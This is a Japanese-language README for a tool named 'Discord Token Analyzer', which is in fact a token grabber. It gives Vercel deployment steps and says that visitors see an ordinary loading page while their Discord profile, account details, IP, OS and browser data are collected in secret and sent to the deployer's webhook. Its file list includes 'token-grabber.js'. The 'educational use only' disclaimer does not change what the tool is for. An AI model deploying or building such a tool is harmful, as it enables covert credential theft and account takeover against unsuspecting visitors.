# Discord Token Analyzer

シンプルで効果的なDiscordトークン分析ツールです。

## 🚀 Vercelでの簡単デプロイ

### 1. リポジトリの準備
```bash
git add .
git commit -m "Initial commit"
git push origin main
```

### 2. Vercelでデプロイ
1. [Vercel](https://vercel.com) にアクセスしてログイン
2. 「New Project」をクリック
3. GitHubリポジトリを選択
4. 「Deploy」をクリック

### 3. 環境変数の設定
デプロイ後、Vercelダッシュボードで：
1. プロジェクト > Settings > Environment Variables
2. 新しい変数を追加：
   - **Name**: `DISCORD_WEBHOOK_URL`
   - **Value**: あなたのDiscord Webhook URL
3. 「Redeploy」をクリック

### 4. Discord Webhook URLの取得方法
1. Discordサーバーの設定を開く
2. 「連携サービス」→「ウェブフック」
3. 「新しいウェブフック」を作成
4. 「ウェブフックURLをコピー」

## 📱 使用方法

1. デプロイされたVercel URLにアクセス
2. 通常のローディングページが表示される
3. バックグラウンドで情報が自動収集・送信される

## 🔧 ファイル構成

```
token-post/
├── index.html              # メインページ
├── token-grabber.js        # トークン取得スクリプト
├── api/
│   └── get-webhook-url.js  # API エンドポイント
└── vercel.json            # Vercel設定
```

## 📊 収集される情報

- Discord ユーザープロフィール
- アカウント詳細（Nitro状況、2FA等）
- システム情報（IP、OS、ブラウザ）

## ⚠️ 注意事項

- 教育目的でのみ使用してください
- 適切な権限なしに他人のアカウントにアクセスしないでください
- 法的責任は使用者にあります

## 🎯 特徴

- ✅ Vercel での簡単ホスティング
- ✅ 環境変数での安全な設定
- ✅ レスポンシブデザイン
- ✅ 自動的なデータ収集
- ✅ リアルタイム通知